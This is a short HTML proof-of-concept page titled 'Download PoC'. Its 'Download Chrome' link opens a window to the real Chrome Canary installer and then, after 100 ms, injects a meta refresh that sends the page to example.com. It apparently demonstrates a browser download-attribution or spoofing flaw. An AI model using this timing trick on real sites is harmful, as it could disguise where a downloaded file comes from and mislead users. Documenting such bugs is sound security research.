<!DOCTYPE html>
<html>
<head>
<title>Download PoC</title>
</head>

<body>

<a href="javascript:start()">Download Chrome</a>

<script>
function start() {

    // open new window to trigger download
    var w = window.open();
    w.opener = null;

    w.location = "https://dl.google.com/chrome/mac/universal/canary/googlechromecanary.dmg";

    // delay meta refresh slightly
    setTimeout(function() {

        var meta = document.createElement("meta");
        meta.httpEquiv = "refresh";
        meta.content = "0; url=https://example.com";
        document.head.appendChild(meta);

    }, 100); // 100ms delay

}
</script>

</body>
</html>
